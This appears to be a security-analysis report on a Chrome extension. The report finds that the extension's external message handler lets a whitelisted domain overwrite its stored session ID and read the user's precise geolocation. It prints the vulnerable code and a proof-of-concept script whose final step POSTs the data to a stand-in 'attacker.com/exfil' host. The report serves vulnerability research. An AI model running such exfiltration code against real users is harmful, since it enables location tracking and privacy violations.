# CoCo Analysis: iakjjemflololophjmhajchoojhehbcf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/iakjjemflololophjmhajchoojhehbcf/opgen_generated_files/bg.js
Line 1119: chrome.storage.sync.set({ sessionId: request.sessionId }, function () {

**Code:**

```javascript
// Background script bg.js - External message handler (Lines 1101-1124)
chrome.runtime.onMessageExternal.addListener(
    function (request, sender, sendResponse) {

        if (request.action == "getSession") {
            chrome.storage.sync.get(["sessionId"], function (options) {
                navigator.geolocation.getCurrentPosition(function (position) {
                    sendResponse({
                        sessionId: options.sessionId,
                        lat: position.coords.latitude,
                        long: position.coords.longitude
                    }); // ← Sends storage data + geolocation to external caller
                });
            });
        }
        else if (request.action == "setSession") {
            chrome.storage.sync.set({
                sessionId: request.sessionId // ← attacker-controlled
            }, function () {
                sendResponse();
            });
        }
        else if (request.action == "reload") {
            navigator.geolocation.getCurrentPosition(function (position) {
                getSession(null, position);
            }, function (positionError) {
                console.error(positionError);
            });
        }
        else if (request.action == "pause") {
            var oldDateObj = new Date();
            var newDateObj = new Date(oldDateObj.getTime() + 5 * 60000);
            chrome.storage.sync.set({ pauseTime: newDateObj.getTime() }, function () {
                chrome.notifications.create(baseUXUrl + "/dashboard.html", {
                    type: "basic",
                    iconUrl: "/icons/notificationIcon.png",
                    title: "BuyLocal.Cloud",
                    message: "Notifications paused for 5 minutes"
                }, function (notification) { });
            });
        }
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domain (buylocal.cloud)

**Attack:**

```javascript
// From https://www.buylocal.cloud/* page (whitelisted in externally_connectable)

// Step 1: Poison the storage with attacker-controlled sessionId
chrome.runtime.sendMessage(
    'iakjjemflololophjmhajchoojhehbcf', // extension ID
    { action: "setSession", sessionId: "attacker_controlled_session_id" },
    function(response) {
        console.log("Storage poisoned");
    }
);

// Step 2: Retrieve the poisoned sessionId + user's geolocation
chrome.runtime.sendMessage(
    'iakjjemflololophjmhajchoojhehbcf', // extension ID
    { action: "getSession" },
    function(response) {
        console.log("Retrieved data:", response);
        // response = {
        //   sessionId: "attacker_controlled_session_id",
        //   lat: user_latitude,
        //   long: user_longitude
        // }
        // Send to attacker's server
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(response)
        });
    }
);
```

**Impact:** Complete storage exploitation chain with sensitive data disclosure. An attacker controlling a page on the whitelisted domain (buylocal.cloud) or via XSS on that domain can:
1. Poison the extension's storage with arbitrary sessionId values
2. Retrieve stored sessionId along with the user's precise geolocation coordinates (latitude/longitude)
3. Exfiltrate sensitive geolocation data to attacker-controlled servers

The extension exposes user geolocation data to external callers through the onMessageExternal interface, allowing tracking and privacy violations. Even though only one domain is whitelisted, this constitutes a TRUE POSITIVE vulnerability as per the methodology.

---

## Sink 2: storage_sync_get_source → sendResponseExternal_sink

**Note:** This is the same vulnerability as Sink 1, representing the information disclosure aspect of the storage exploitation chain where stored data (including geolocation) is sent back to the external caller via sendResponse.
